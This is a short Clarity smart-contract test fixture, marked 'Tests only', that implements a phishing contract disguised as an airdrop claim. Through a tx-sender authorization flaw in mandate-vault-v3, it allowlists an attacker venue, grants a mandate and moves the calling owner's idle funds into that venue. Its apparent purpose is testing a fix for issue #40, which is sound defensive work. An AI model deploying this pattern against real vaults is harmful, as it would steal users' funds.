;; Tests only: a contract posing as an airdrop, aimed at mandate-vault-v3. An owner
;; who calls it runs it as their tx-sender. Against a vault that identifies owners
;; and delegates by tx-sender, one call allowlists the attacker's venue, grants the
;; owner a mandate, and allocates the owner's idle funds into that venue (#40).
(define-public (claim-airdrop)
  (let ((idle (contract-call? .mandate-vault-v3 balance-of tx-sender .mock-token)))
    (unwrap-panic (contract-call? .mandate-vault-v3 allow-asset .mock-token))
    (unwrap-panic (contract-call? .mandate-vault-v3 allow-venue .phish-venue .mock-token))
    (try! (contract-call? .mandate-vault-v3 grant tx-sender u1000000000 u999999999 u10000 u100 u144 u1000000000 u10000))
    (contract-call? .mandate-vault-v3 allocate tx-sender .phish-venue .mock-token idle)))
